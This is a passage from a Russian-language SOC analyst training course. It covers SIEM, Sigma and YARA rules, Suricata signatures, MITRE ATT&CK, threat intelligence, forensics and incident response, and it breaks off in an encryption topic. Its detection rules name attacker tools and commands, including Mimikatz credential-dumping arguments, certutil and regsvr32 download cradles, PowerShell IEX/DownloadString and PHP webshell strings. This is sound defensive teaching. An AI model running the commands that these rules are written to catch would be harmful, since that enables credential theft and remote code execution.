| **Splunk** | Коммерческий | $$$$ | Лидер рынка, мощная аналитика | Очень дорого (по объёму данных) |
| **QRadar** | Коммерческий | $$$ | Хорошая корреляция | Сложность, дорого |
| **KUMA** | Коммерческий (РФ) | $$$ | Сертифицирован ФСТЭК | Закрытая экосистема |
| **MaxPatrol SIEM** | Коммерческий (РФ) | $$$ | Работа с российскими ИС | Закрытая экосистема |

**Что SIEM может:**
- Собирать и хранить логи из всех источников
- Корреляция событий из разных источников (IP из firewall + Event ID из Windows = одна история)
- Алерты по правилам (Sigma)
- Ретроспективный поиск (hunting)
- Отчёты для compliance

**Что SIEM НЕ может:**
- Заменить аналитика (алерты без человека = шум)
- Обнаружить всё (нужны правила и туning)
- Работать без настройки (garbage in = garbage out)
- Защитить от атаки (SIEM обнаруживает, не предотвращает)

### Типичные ошибки

1. **«Поставил SIEM — безопасен»** — SIEM без правил, без настроенных источников и без аналитика — дорогой лог-сервер.
2. **«Нужно собирать ВСЕ логи»** — Нет. Собирайте то, что можете обработать. Debug-логи переполняют хранилище и создают шум.
3. **«Правила из коробки достаточно»** — Каждая среда уникальна. Нужно адаптировать и добавлять свои правила. False positives нужно тюнить.

### Ключевые термины

| Термин | Значение |
|--------|----------|
| **SIEM** | Security Information and Event Management |
| **Нормализация** | Приведение логов к единому формату |
| **Корреляция** | Связывание событий из разных источников |
| **EPS** | Events Per Second — метрика нагрузки SIEM |
| **Retention** | Срок хранения логов |
| **Tuning** | Настройка правил для снижения false positives |

## Тема 16: Sigma-правила: полный разбор

### Зачем это знать защитнику

Sigma — универсальный формат правил детекции, работающий в любом SIEM. Знание Sigma позволяет SOC-аналитику писать правила один раз и конвертировать их для Wazuh, Splunk, ELK или любого другого SIEM. Sigma-правила — главный язык blue team.

### Простое объяснение (аналогия)

Sigma — это «Эсперанто» для правил детекции. Каждый SIEM говорит на своём языке: Splunk понимает SPL, ELK — KQL, Wazuh — свой XML. Sigma — единый формат, который конвертируется в любой из них. Вы пишете правило один раз, а конвертер создаёт версию для вашего SIEM.

### Как это работает

**Структура Sigma-правила:**

```yaml
title: Обнаружение Mimikatz                    # Название
id: 0d7e4538-4123-4b4e-8b4a-2b1e5d4a1b3c     # UUID
status: test                                    # test/stable/experimental
description: Обнаружение запуска Mimikatz       # Описание
references:                                     # Ссылки
    - https://attack.mitre.org/techniques/T1003
author: SOC Team                                # Автор
date: 2026/11/12                                # Дата
tags:                                           # MITRE ATT&CK
    - attack.credential_access
    - attack.t1003.001

logsource:                                      # Источник логов
    category: process_creation                  #   Тип: создание процесса
    product: windows                            #   ОС: Windows

detection:                                      # Логика обнаружения
    selection_image:                            #   Вариант 1: имя файла
        Image|endswith:
            - '\mimikatz.exe'
    selection_cmdline:                          #   Вариант 2: аргументы
        CommandLine|contains:
            - 'sekurlsa::logonpasswords'
            - 'lsadump::dcsync'
            - 'privilege::debug'
    selection_hash:                             #   Вариант 3: хеш файла
        Hashes|contains:
            - 'IMPHASH=B8D0FF2E7B657EF63D764B6C4A3109E0'
    condition: selection_image or selection_cmdline or selection_hash

falsepositives:                                 # Ложные срабатывания
    - Legitimate security testing
level: critical                                 # Уровень: low/medium/high/critical
```

**Модификаторы (полный список):**

| Модификатор | Описание | Пример |
|-------------|---------|--------|
| `contains` | Содержит подстроку | `CommandLine\|contains: 'whoami'` |
| `endswith` | Заканчивается на | `Image\|endswith: '\cmd.exe'` |
| `startswith` | Начинается с | `TargetFilename\|startswith: 'C:\Temp'` |
| `re` | Регулярное выражение | `CommandLine\|re: '.*-enc.*[A-Za-z0-9+/=]{50,}'` |
| `base64offset` | Поиск строки внутри Base64 | `CommandLine\|base64offset: 'IEX'` |
| `all` | Все значения из списка (AND) | `CommandLine\|contains\|all:` |
| `cidr` | IP в подсети | `SourceIP\|cidr: '10.0.0.0/8'` |

**5 примеров от простого к сложному:**

**Пример 1 — Простой (один критерий):**
```yaml
title: Запуск certutil для скачивания файла
detection:
    selection:
        CommandLine|contains|all:
            - 'certutil'
            - '-urlcache'
            - '-f'
    condition: selection
level: high
```

**Пример 2 — Selection + Filter:**
```yaml
title: Запуск процесса из необычной директории
detection:
    selection:
        Image|contains:
            - '\AppData\Local\Temp\'
            - '\Downloads\'
    filter:
        Image|endswith:
            - '\chrome_installer.exe'  # Нормальный установщик
    condition: selection and not filter
level: medium
```

**Пример 3 — Несколько selections (OR):**
```yaml
title: LOLBins — подозрительное использование
detection:
    sel_certutil:
        Image|endswith: '\certutil.exe'
        CommandLine|contains: '-decode'
    sel_mshta:
        Image|endswith: '\mshta.exe'
        CommandLine|contains: 'http'
    sel_regsvr32:
        Image|endswith: '\regsvr32.exe'
        CommandLine|contains: '/s /n /u /i:http'
    condition: sel_certutil or sel_mshta or sel_regsvr32
level: high
```

**Пример 4 — Агрегация (count):**
```yaml
title: Brute-force — 10+ неудачных входов за 5 минут
detection:
    selection:
        EventID: 4625
    timeframe: 5m
    condition: selection | count(TargetUserName) by IpAddress > 10
level: high
```

**Пример 5 — Proximity (near):**
```yaml
title: Brute-force + успешный вход (компрометация)
detection:
    selection_fail:
        EventID: 4625
    selection_success:
        EventID: 4624
        LogonType: 3
    timeframe: 10m
    condition: selection_fail | count() > 5 | near selection_success
level: critical
```

### Что видит SOC-аналитик

**Конвертация Sigma → Wazuh:**
```bash
sigma convert -t wazuh rule.yml
```

**Конвертация Sigma → Splunk SPL:**
```
process_creation CommandLine="*certutil*-urlcache*-f*"
```

### Типичные ошибки

1. **«Одно Sigma-правило = одна атака»** — Хорошее правило покрывает технику, а не конкретный инструмент. Mimikatz — один инструмент для credential dumping, но их десятки.
2. **«Sigma работает из коробки»** — Sigma-правило нужно конвертировать под ваш SIEM и адаптировать (tuning) под вашу среду.
3. **«Level: critical = всегда серьёзно»** — Без tuning даже critical-правила могут давать false positives. Уровень — рекомендация, не абсолютная истина.

### Ключевые термины

| Термин | Значение |
|--------|----------|
| **Sigma** | Универсальный формат правил детекции для SIEM |
| **logsource** | Описание источника логов (product, service, category) |
| **detection** | Логика обнаружения (selection, filter, condition) |
| **pySigma** | Python-библиотека для конвертации Sigma-правил |
| **Modifier** | Модификатор для поля (contains, endswith, re, etc.) |
| **Aggregation** | Группировка событий (count, near, temporal) |

## Тема 17: YARA-правила: полный разбор

### Зачем это знать защитнику

YARA — инструмент для идентификации и классификации малвари по паттернам в файлах и памяти. В отличие от Sigma (работает с логами), YARA работает с файлами и процессами напрямую. SOC-аналитик использует YARA для triage подозрительных файлов и hunting в файловой системе.

### Простое объяснение (аналогия)

Если Sigma — это детектив, который ищет подозрительное поведение по записям камер наблюдения, то YARA — это криминалист, который ищет улики в вещественных доказательствах. YARA смотрит «внутрь» файла и ищет характерные строки, последовательности байтов или структуры, как отпечатки пальцев преступника.

### Как это работает

**Структура YARA-правила:**

```
rule Detect_Webshell_PHP
{
    meta:
        author = "SOC Team"
        description = "Обнаружение PHP web shell"
        date = "2026-11-12"
        severity = "high"

    strings:
        $s1 = "eval($_POST" ascii          // Текстовая строка
        $s2 = "base64_decode($_GET" ascii
        $s3 = "system($_REQUEST" ascii
        $s4 = { 65 76 61 6C 28 }          // Hex-строка: "eval("
        $r1 = /passthru\s*\(\s*\$_/ ascii  // Регулярное выражение

    condition:
        filesize < 100KB and
        any of ($s*) or $r1
}
```

**Типы строк:**

| Тип | Синтаксис | Пример | Описание |
|-----|----------|--------|---------|
| Текст | `"строка"` | `"eval("` | Точное совпадение текста |
| Hex | `{ XX XX }` | `{ 4D 5A }` | Последовательность байтов (MZ header) |
| Regex | `/pattern/` | `/http[s]?:\/\/[0-9.]+/` | Регулярное выражение |

**Модификаторы строк:** `ascii`, `wide` (UTF-16LE), `nocase`, `fullword`, `base64`.

**Условия (condition):**

```
condition: all of them                    # Все строки найдены
condition: any of ($s*)                   # Любая строка с префиксом $s
condition: 2 of ($s1, $s2, $s3)           # Минимум 2 из трёх
condition: #s1 > 5                        # Строка $s1 встречается > 5 раз
condition: $s1 at 0                       # $s1 в начале файла (offset 0)
condition: filesize < 1MB                 # Размер файла
condition: uint16(0) == 0x5A4D            # Первые 2 байта = MZ (PE-файл)
```

**Модули YARA:**

| Модуль | Назначение | Пример |
|--------|-----------|--------|
| **pe** | Анализ PE-файлов (Windows EXE/DLL) | `pe.imports("kernel32.dll", "VirtualAlloc")` |
| **math** | Математические функции | `math.entropy(0, filesize) > 7.0` (упакованный) |
| **hash** | Хеширование | `hash.md5(0, filesize) == "..."` |
| **elf** | Анализ ELF-файлов (Linux) | `elf.type == elf.ET_EXEC` |

**5 примеров YARA-правил:**

```
rule PE_Packed_High_Entropy
{
    meta:
        description = "PE-файл с высокой энтропией (возможно упакован)"
    condition:
        uint16(0) == 0x5A4D and
        math.entropy(0, filesize) > 7.2
}

rule Suspicious_PowerShell_Script
{
    meta:
        description = "Подозрительный PowerShell-скрипт"
    strings:
        $a1 = "IEX" ascii nocase
        $a2 = "Invoke-Expression" ascii nocase
        $b1 = "Net.WebClient" ascii
        $b2 = "DownloadString" ascii
        $b3 = "FromBase64String" ascii
    condition:
        any of ($a*) and any of ($b*)
}

rule CryptoMiner_Indicators
{
    meta:
        description = "Индикаторы криптомайнера"
    strings:
        $pool1 = "stratum+tcp://" ascii
        $pool2 = "pool.minexmr" ascii
        $pool3 = "xmrpool" ascii
        $wallet = /[0-9a-zA-Z]{95}/ ascii
        $algo = "cryptonight" ascii nocase
    condition:
        any of ($pool*) or ($wallet and $algo)
}
```

**Когда YARA vs Sigma:**

| Критерий | YARA | Sigma |
|---------|------|-------|
| Работает с | Файлами, памятью | Логами, событиями |
| Обнаруживает | Малварь, артефакты | Поведение, действия |
| Формат паттернов | Строки, байты, regex | Поля логов |
| Применение | Triage файлов, scanning | Мониторинг SIEM |
| Время | Пост-факт (файл уже есть) | Реальное время (событие происходит) |

### Типичные ошибки

1. **«YARA заменяет антивирус»** — YARA — инструмент поиска по паттернам, не полноценная защита. У антивирусов есть поведенческий анализ, sandbox и т.д.
2. **«Одно правило на все варианты малвари»** — Малварь мутирует. Нужны правила на семейства, не на конкретные образцы.
3. **«YARA на всю ФС — быстро»** — Сканирование всей файловой системы YARA — ресурсоёмкая операция. Используйте на подозрительных файлах или в ограниченных папках.

### Ключевые термины

| Термин | Значение |
|--------|----------|
| **YARA** | «Yet Another Ridiculous Acronym» — инструмент поиска паттернов |
| **rule** | Правило YARA (имя, meta, strings, condition) |
| **PE** | Portable Executable — формат Windows EXE/DLL |
| **Entropy** | Мера случайности данных (высокая = упакован/зашифрован) |
| **IoC** | Indicator of Compromise — хеш, строка, IP |
| **Wildcard** | Подстановочный символ в hex-строках `{ 4D 5A ?? ?? }` |

## Тема 18: IDS/IPS: Suricata изнутри

### Зачем это знать защитнику

Suricata — ведущая open-source IDS/IPS, использующая глубокий анализ пакетов (DPI). SOC-аналитик работает с алертами Suricata ежедневно и должен уметь писать свои правила, понимать формат EVE JSON и настраивать детекцию сетевых атак.

### Простое объяснение (аналогия)

Suricata — это рентген-аппарат на входе в здание. Он просвечивает каждый сетевой «пакет», ищет запрещённые предметы по известным образцам (сигнатуры) и поднимает тревогу. В режиме IDS он только сигнализирует, в режиме IPS — ещё и задерживает «пакет».

### Как это работает

```
Архитектура Suricata:

  Сеть                   Suricata                     SIEM
   │                ┌───────────────────────────┐
   │ Пакеты         │ 1. CAPTURE (захват)       │
   │───────────────>│    AF_PACKET / PF_RING    │
   │                │                           │
   │                │ 2. DECODE (декодирование)  │
   │                │    Ethernet → IP → TCP →  │
   │                │    HTTP/DNS/TLS/...       │
   │                │                           │
   │                │ 3. DETECT (обнаружение)    │     Алерты
   │                │    Правила ET Open /      │────> EVE JSON
   │                │    Custom rules           │     ───────>
   │                │                           │
   │                │ 4. OUTPUT (вывод)          │     Логи:
   │   [IPS mode:]  │    EVE JSON, fast.log,   │     eve.json
   │<──DROP/REJECT──│    pcap                   │     http.log
   │                └───────────────────────────┘     dns.log
                     Multi-threaded (>10 Gbps)
```

**IDS vs IPS:**

| Режим | Действие | Deployment | Последствия ошибки |
|-------|---------|-----------|-------------------|
| **IDS** | Мониторит, алертит | Mirror/SPAN port | False positive = лишний алерт |
| **IPS** | Мониторит, блокирует | Inline (bridge) | False positive = легитимный трафик заблокирован |

**Формат правила Suricata:**

```
action protocol src_ip src_port -> dst_ip dst_port (options)

Пример:
alert http $HOME_NET any -> $EXTERNAL_NET any (
    msg:"ET MALWARE Possible CobaltStrike Beacon";
    content:"GET"; http_method;
    content:"/pixel.gif"; http_uri;
    content:"Cookie:"; http_header;
    pcre:"/Cookie:\s[A-Za-z0-9+/=]{50,}/H";
    sid:2030001; rev:1;
    classtype:trojan-activity;
    reference:url,attack.mitre.org/techniques/T1071;
)
```

**Разбор опций:**

| Опция | Описание | Пример |
|-------|---------|--------|
| `msg` | Текст алерта | `msg:"Scan detected"` |
| `content` | Поиск подстроки | `content:"GET"` |
| `http_method` | Модификатор: HTTP-метод | Привязка content к методу |
| `http_uri` | Модификатор: URI | Привязка content к пути |
| `http_header` | Модификатор: HTTP-заголовок | Привязка content к заголовкам |
| `pcre` | Regex | `pcre:"/pattern/i"` |
| `sid` | ID правила (уникальный) | `sid:2030001` |
| `classtype` | Категория угрозы | `classtype:trojan-activity` |
| `threshold` | Ограничение частоты | `threshold:type limit,track by_src,count 1,seconds 60` |
| `flow` | Направление потока | `flow:established,to_server` |

**EVE JSON (формат вывода):**
```json
{
  "timestamp": "2026-11-12T10:15:23.000000+0000",
  "event_type": "alert",
  "src_ip": "192.168.1.50",
  "src_port": 49152,
  "dest_ip": "198.51.100.10",
  "dest_port": 443,
  "proto": "TCP",
  "alert": {
    "action": "allowed",
    "gid": 1,
    "signature_id": 2030001,
    "rev": 1,
    "signature": "ET MALWARE Possible CobaltStrike Beacon",
    "category": "A Network Trojan was Detected",
    "severity": 1
  },
  "http": {
    "hostname": "suspicious.xyz",
    "url": "/pixel.gif",
    "http_method": "GET",
    "http_user_agent": "Mozilla/5.0"
  }
}
```

### Типичные ошибки

1. **«Suricata в IPS-режиме безопасна из коробки»** — В IPS-режиме false positive блокирует легитимный трафик. Сначала протестируйте правила в IDS-режиме.
2. **«ET Open правила достаточно»** — ET Open — базовый набор. Для продвинутой детекции нужны ET Pro (платные) или кастомные правила.
3. **«Suricata видит всё в HTTPS»** — Suricata видит SNI, JA3 и метаданные TLS, но НЕ видит содержимое HTTPS-трафика.

### Ключевые термины

| Термин | Значение |
|--------|----------|
| **IDS** | Intrusion Detection System — обнаруживает, не блокирует |
| **IPS** | Intrusion Prevention System — обнаруживает и блокирует |
| **DPI** | Deep Packet Inspection — анализ содержимого пакетов |
| **EVE JSON** | Extensible Event JSON — формат логов Suricata |
| **ET Open** | Emerging Threats Open — бесплатный набор правил |
| **SID** | Signature ID — уникальный номер правила |

## Тема 19: MITRE ATT&CK для SOC

### Зачем это знать защитнику

MITRE ATT&CK — глобальная база знаний о тактиках и техниках атакующих. Это «общий язык» для всего SOC: от написания правил детекции до отчётов об инцидентах. Без ATT&CK SOC работает вслепую.

### Простое объяснение (аналогия)

ATT&CK — это «периодическая таблица элементов» для кибербезопасности. Как химик знает, что водород — элемент №1, так SOC-аналитик знает, что T1566 — фишинг. Матрица ATT&CK систематизирует ВСЕ известные техники атакующих, позволяя вам: (1) проверить, от чего вы защищены, (2) найти дыры в детекции, (3) общаться с коллегами на одном языке.

### Как это работает

**Структура ATT&CK:**

```
ТАКТИКИ (ЧТО атакующий хочет сделать):
──────────────────────────────────────────────────────────
│ Initial  │ Exec │ Persist │ Priv │ Defense │ Cred  │ Discovery │ Lateral │ Collect │ C2 │ Exfil │ Impact │
│ Access   │ ution│ ence    │ Esc  │ Evasion │ Access│           │ Movement│ ion     │    │ tration│        │
──────────────────────────────────────────────────────────

Под каждой тактикой — ТЕХНИКИ (КАК именно):
│ Initial Access                         │
│  ├── T1566 Phishing                    │
│  │   ├── T1566.001 Spearphishing Link  │ ← Суб-техника
│  │   ├── T1566.002 Spearphishing Attach│
│  │   └── T1566.003 Spearphishing via   │
│  │       Service                        │
│  ├── T1190 Exploit Public-Facing App   │
│  ├── T1133 External Remote Services    │
│  └── T1078 Valid Accounts              │
```

**Как SOC использует ATT&CK:**

1. **Mapping алертов:** Каждый алерт/Sigma-правило привязывается к технике ATT&CK
2. **Coverage Analysis:** Матрица показывает, какие техники у вас покрыты детекцией, а какие — нет
3. **Threat Hunting:** «Какие техники группа APT29 использует? Есть ли у нас детекция для каждой?»
4. **Purple Teaming:** Red team воспроизводит технику, Blue team проверяет, обнаруживает ли SIEM

**Маппинг 10 алертов на ATT&CK (практика):**

| Алерт | Тактика | Техника | ID |
|-------|---------|---------|-----|
| Nmap SYN scan | Discovery | Network Service Scanning | T1046 |
| Failed SSH (brute-force) | Credential Access | Brute Force | T1110.001 |
| PowerShell download cradle | Execution | PowerShell | T1059.001 |
| New scheduled task | Persistence | Scheduled Task | T1053.005 |
| LSASS access | Credential Access | OS Credential Dumping | T1003.001 |
| PsExec lateral | Lateral Movement | Remote Services: SMB | T1021.002 |
| New service installed | Persistence | Create or Modify System Process | T1543.003 |
| DNS tunneling | Command and Control | DNS | T1071.004 |
| Certutil -decode | Defense Evasion | Deobfuscate/Decode | T1140 |
| Ransomware canary | Impact | Data Encrypted for Impact | T1486 |

### Типичные ошибки

1. **«Нужно покрыть ВСЕ техники»** — Приоритизируйте по threat intelligence: какие техники используются чаще и какие группы атакуют вашу отрасль.
2. **«ATT&CK только для incident response»** — ATT&CK используется на ВСЕХ этапах: от проектирования детекции до threat hunting и отчётности.
3. **«Одна техника = один алерт»** — Одна техника может проявляться по-разному. T1059.001 (PowerShell) — это и IEX, и Invoke-WebRequest, и encoded commands.

### Ключевые термины

| Термин | Значение |
|--------|----------|
| **Tactic** | Цель атакующего (зачем) |
| **Technique** | Способ достижения цели (как) |
| **Sub-technique** | Детализация техники |
| **Procedure** | Конкретная реализация техники конкретной группой |
| **ATT&CK Navigator** | Визуализатор покрытия матрицы |
| **Coverage** | Процент покрытых техник детекцией |

## Тема 20: Threat Intelligence

### Зачем это знать защитнику

Threat Intelligence (TI) превращает SOC из реактивного («мы обнаружили атаку после того, как она произошла») в проактивный («мы знаем, какие атаки готовятся и на что обращать внимание»). TI-аналитик обогащает алерты контекстом: откуда IP, к какой группе относится малварь, какие ещё IoC связаны.

### Простое объяснение (аналогия)

Представьте полицию без разведки: патрульные ловят преступников только когда видят их на месте преступления. Threat Intelligence — это разведка: она говорит: «Банда X планирует ограбление банка Y на улице Z. Они используют белый фургон с номером ABC. Их почерк — взлом через чёрный ход». Теперь полиция знает, что искать ДО преступления.

### Как это работает

**Типы Threat Intelligence:**

| Тип | Для кого | Пример | Применение |
|-----|---------|--------|-----------|
| **Strategic** | CISO, руководство | «APT-группы из Китая атакуют ваш сектор» | Стратегия безопасности |
| **Tactical** | SOC L3, Threat Hunters | «Группа X использует T1566 + T1059 + T1003» | Правила детекции |
| **Operational** | SOC L2, IR | «Завтра ожидается кампания с использованием CVE-2026-1234» | Подготовка к инциденту |
| **Technical** | SOC L1, автоматизация | «IP 198.51.100.50, hash ABC123, domain evil.com» | Блокировка, алерты |

**Пирамида боли (Pyramid of Pain):**

```
          ┌──────────────────┐
          │   TTPs            │  ← Самое ценное (поведение)
          │   (Тактики,       │     Труднее всего изменить
          │    техники)       │     атакующему
         ┌┴──────────────────┴┐
         │    Tools            │  ← Инструменты (Mimikatz,
         │    (инструменты)    │     CobaltStrike)
        ┌┴────────────────────┴┐
        │  Network / Host      │  ← Артефакты
        │  Artifacts           │     (мьютексы, pipe-имена)
       ┌┴──────────────────────┴┐
       │   Domain Names         │  ← Домены C2
      ┌┴────────────────────────┴┐
      │    IP Addresses          │  ← Легко менять
     ┌┴──────────────────────────┴┐
     │      Hash Values           │  ← Тривиально менять
     │  (самое простое, но и      │     (1 бит = новый хеш)
     │   наименее ценное)         │
     └────────────────────────────┘
```

**IoC (Indicators of Compromise):**

| Тип | Пример | Как использовать |
|-----|--------|----------------|
| IP-адрес | 198.51.100.50 | Firewall block, SIEM alert |
| Домен | evil.example.com | DNS sinkhole, proxy block |
| URL | http://evil.com/payload.exe | Proxy block |
| Hash (MD5/SHA256) | a1b2c3... | EDR/AV detection, file scanning |
| Email | attacker@evil.com | Email gateway block |
| YARA rule | rule Malware_X {...} | File scanning |
| Sigma rule | title: Detect_X | SIEM detection |

**Источники TI:**

| Источник | Тип | Бесплатный? |
|---------|-----|------------|
| **AlienVault OTX** | IoC feeds | Да |
| **MISP** | Sharing platform | Да (self-hosted) |
| **AbuseIPDB** | IP reputation | Да (лимит) |
| **VirusTotal** | File/URL analysis | Да (лимит) |
| **Shodan** | Internet scanning | Частично |
| **CERT-RU / НКЦКИ** | Национальный CERT | Да |

### Типичные ошибки

1. **«Больше IoC = лучше»** — Качество важнее количества. Устаревшие IoC создают шум (false positives).
2. **«Хеши — лучший индикатор»** — Хеш = конкретный файл. Изменение одного бита = новый хеш. Используйте YARA и поведенческую детекцию.
3. **«TI — отдельная функция, не связанная с SOC»** — TI должен быть интегрирован в workflow SOC: обогащение алертов, hunting, writing rules.

### Ключевые термины

| Термин | Значение |
|--------|----------|
| **TI** | Threat Intelligence — разведка угроз |
| **IoC** | Indicator of Compromise — индикатор компрометации |
| **STIX** | Structured Threat Information eXpression — формат обмена TI |
| **TAXII** | Trusted Automated eXchange of Indicator Information — протокол обмена |
| **MISP** | Malware Information Sharing Platform |
| **Feed** | Поток данных TI (списки IoC) |

## Тема 21: Digital Forensics: методология

### Зачем это знать защитнику

Форензика — систематический сбор и анализ цифровых улик. Без правильной методологии улики могут быть непригодны для суда, а важные артефакты — потеряны. SOC-аналитик L2+ должен знать основы форензики для правильного сбора улик при инциденте.

### Простое объяснение (аналогия)

Цифровая форензика — как работа криминалистов на месте преступления. Первое правило: не трогать улики голыми руками (не изменять исходные данные). Второе: фотографировать всё (делать образы). Третье: документировать каждый шаг (chain of custody). Если нарушить процедуру — улики не примут в суде.

### Как это работает

**Order of Volatility (порядок сбора по летучести):**

```
Самое летучее (собирать ПЕРВЫМ):
1. ┌─ Регистры CPU, кеш         ─┐
2. │  RAM (оперативная память)    │  ← Volatility, AVML
3. │  Сетевые соединения          │  ← netstat, ss
4. │  Запущенные процессы          │  ← ps, tasklist
5. │  Временные файлы              │  ← /tmp, %TEMP%
6. │  Диск (файловая система)      │  ← dd, FTK Imager
7. │  Удалённые файлы              │  ← Autopsy, TestDisk
8. └─ Бэкапы, логи на других      ─┘  ← Долговременное хранение
        серверах
Наименее летучее (можно позже):
```

**Chain of Custody (цепочка владения):**

| Поле | Описание |
|------|---------|
| Что | Описание объекта (HDD Samsung 1TB, S/N: XXX) |
| Когда | Дата и время изъятия |
| Кто | Кто изъял (ФИО, должность) |
| Где | Откуда (сервер SRV-01, стойка А3) |
| Хеш | MD5/SHA256 образа на момент создания |
| Передача | Каждая передача между людьми документируется |

**Forensic Imaging (создание образа):**

```bash
# Linux: dd (побитовая копия)
dd if=/dev/sda of=/evidence/disk.img bs=4M status=progress
md5sum /dev/sda > /evidence/disk.img.md5     # Контрольная сумма

# Проверка целостности:
md5sum /evidence/disk.img                      # Должен совпасть

# Write blocker: обязателен для физических дисков!
# Программный: blockdev --setro /dev/sdb
```

**Типы анализа:**

| Тип | Описание | Когда |
|-----|---------|-------|
| **Live Response** | Анализ работающей системы | Система ещё работает, нужны volatile данные |
| **Dead Analysis** | Анализ образа выключенной системы | Система выключена, или работают с копией |
| **Memory Forensics** | Анализ дампа памяти | Ищем малварь, injection, скрытые процессы |
| **Network Forensics** | Анализ PCAP / логов трафика | Ищем C2, эксфильтрацию |

**Артефакты по категориям (Windows):**

| Категория | Артефакт | Инструмент |
|----------|---------|-----------|
| Выполнение | Prefetch, Amcache, Shimcache | PECmd, AmcacheParser |
| Файловая активность | MFT, USN Journal, $I30 | MFTECmd, USNParser |
| Реестр | NTUSER.DAT, SAM, SYSTEM | RegRipper, Registry Explorer |
| Сеть | SRUM, DNS cache | SrumDump |
| Пользователь | Recent, Jump Lists, LNK | JLECmd, LECmd |
| Браузер | History, cookies, downloads | Hindsight (Chrome) |

### Типичные ошибки

1. **«Можно анализировать на оригинальном диске»** — НИКОГДА. Всегда работайте с образом (копией). Оригинал — улика.
2. **«Если компьютер заражён — выключить»** — Выключение уничтожает RAM. Сначала дамп памяти, потом выключение.
3. **«Форензика не нужна для SOC»** — SOC L2/L3 регулярно проводит triage: быстрый сбор ключевых артефактов для определения масштаба инцидента.

### Ключевые термины

| Термин | Значение |
|--------|----------|
| **Forensic Image** | Побитовая копия носителя |
| **Chain of Custody** | Документирование владения уликами |
| **Write Blocker** | Устройство/ПО, блокирующее запись на носитель |
| **Order of Volatility** | Порядок сбора улик по летучести |
| **Triage** | Быстрый предварительный анализ |
| **Artifact** | Цифровой след активности (лог, файл, запись реестра) |

## Тема 22: Incident Response: NIST SP 800-61 подробно

### Зачем это знать защитнику

NIST SP 800-61 — стандарт реагирования на инциденты, используемый SOC-командами по всему миру. Знание этого фреймворка обязательно для SOC-аналитика любого уровня. Без структурированного процесса IR превращается в хаос.

### Простое объяснение (аналогия)

IR по NIST — это как действия пожарной команды. Preparation: учения, проверка оборудования. Detection: кто-то нажал кнопку тревоги. Containment: перекрыть кислород огню. Eradication: потушить. Recovery: восстановить здание. Post-Incident: разобрать, как улучшить.

### Как это работает

**4 фазы IR по NIST SP 800-61:**

```
┌─────────────┐     ┌──────────────────┐     ┌───────────────┐     ┌──────────────┐
│ 1. PREPARATION│    │ 2. DETECTION &   │     │ 3. CONTAINMENT│     │ 4. POST-     │
│              │    │    ANALYSIS       │     │    ERADICATION│     │    INCIDENT  │
│ IR plan      │    │ Мониторинг       │     │    RECOVERY   │     │ Lessons      │
│ Команда      │───>│ Триаж            │───> │               │───> │ Learned      │
│ Инструменты  │    │ Классификация    │     │ Изоляция      │     │ Отчёт        │
│ Контакты     │    │ Приоритизация    │     │ Удаление      │     │ Улучшение    │
│ Обучение     │    │ Уведомление      │     │ Восстановление│     │              │
└─────────────┘     └──────────────────┘     └───────────────┘     └──────────────┘
       ↑                                                                  │
       └──────────────────────── Улучшение ──────────────────────────────┘
```

**Фаза 1: Preparation**
- IR Policy и IR Plan
- Состав команды и роли
- Контакты (CERT, юристы, PR, руководство)
- Инструменты: forensic workstation, jump bag
- Обучение и учения (tabletop exercises)

**Фаза 2: Detection & Analysis**
- Источники: SIEM, IDS, EDR, пользовательские обращения
- Triage: True Positive / False Positive / Benign Positive
- Категория: малварь / DoS / unauthorized access / insider / etc.
- Приоритет: P1 (критический) → P4 (низкий)
- Документирование с первой минуты

**Фаза 3: Containment, Eradication, Recovery**

```
Containment (сдерживание):
├── Short-term: изоляция хоста (отключить сеть, EDR contain)
├── Long-term: патчинг уязвимости, смена паролей
└── Evidence preservation: дамп памяти, образ диска ДО очистки!

Eradication (устранение):
├── Удаление малвари
├── Закрытие persistence (реестр, cron, tasks)
├── Сброс скомпрометированных аккаунтов
└── Проверка других хостов

Recovery (восстановление):
├── Восстановление из бэкапа или переустановка
├── Проверка работоспособности
├── Усиленный мониторинг (72 часа минимум)
└── Поэтапный возврат в продуктивную сеть
```

**Фаза 4: Post-Incident**
- Шаблон отчёта: Timeline, Root Cause, IoC, Recommendations
- Lessons Learned meeting (не позднее 2 недель после инцидента)
- Обновление правил детекции
- Обновление IR-плейбуков

### Типичные ошибки

1. **«Сразу чистить заражённый хост»** — Сначала сбор улик (дамп RAM, образ диска), потом очистка. Иначе вы уничтожили доказательства.
2. **«IR — это только для L3»** — L1 обнаруживает и делает первичный триаж. Каждый уровень SOC участвует в IR.
3. **«После восстановления инцидент закрыт»** — Без Post-Incident Analysis те же ошибки повторятся.

### Ключевые термины

| Термин | Значение |
|--------|----------|
| **IR** | Incident Response — реагирование на инциденты |
| **NIST SP 800-61** | Стандарт IR от NIST |
| **Containment** | Сдерживание — ограничение распространения |
| **Eradication** | Устранение — удаление угрозы |
| **Recovery** | Восстановление нормальной работы |
| **Lessons Learned** | Извлечённые уроки — разбор ошибок |
| **Tabletop Exercise** | Настольное учение — симуляция инцидента |

## Тема 23: Как работает шифрование

### Зачем это знать защитнику

Шифрование лежит в основе TLS, VPN, хранения паролей, подписи кода и защиты данных. SOC-аналитик должен понимать, где шифрование помогает мониторингу (хеши для IoC), а где мешает (зашифрованный C2-трафик), и какие слабости можно обнаружить.

### Простое объяснение (аналогия)

**Симметричное шифрование (AES):** Один замок, один ключ. Быстро, но ключ нужно как-то передать второй стороне.

**Асимметричное шифрование (RSA):** Два ключа — публичный (открытый замок) и приватный (единственный ключ). Любой может закрыть замком, но открыть может только владелец ключа. Медленно, но решает проблему передачи.

**Хеш (SHA-256):** Мясорубка. Из куска мяса можно получить фарш, но из фарша невозможно собрать исходный кусок. Одинаковое мясо → одинаковый фарш (детерминизм). Используется для проверки целостности.

### Как это работает

**AES (Advanced Encryption Standard):**

```
Открытый текст → [AES-256 + ключ (256 бит)] → Шифротекст
Шифротекст    → [AES-256 + тот же ключ]     → Открытый текст

Режимы:
CBC (Cipher Block Chaining): каждый блок зависит от предыдущего
  → Нужен IV (Initialization Vector), уязвим к padding oracle
GCM (Galois/Counter Mode): шифрование + аутентификация
  → Рекомендуемый режим, обнаруживает подмену данных
```

**RSA (упрощённо):**

```
1. Выбираем два простых числа: p=61, q=53
2. n = p × q = 3233
3. Публичный ключ: (n=3233, e=17)
4. Приватный ключ: (n=3233, d=2753)

Шифрование: C = M^e mod n
Расшифровка: M = C^d mod n

Безопасность: факторизация n на p×q — вычислительно сложная задача
```

**Diffie-Hellman (обмен ключами):**

```
Алиса                    Боб
  │                        │
  │  Публичные: p, g       │
  │  Секрет: a             │  Секрет: b
  │                        │
  │  A = g^a mod p ──────>│
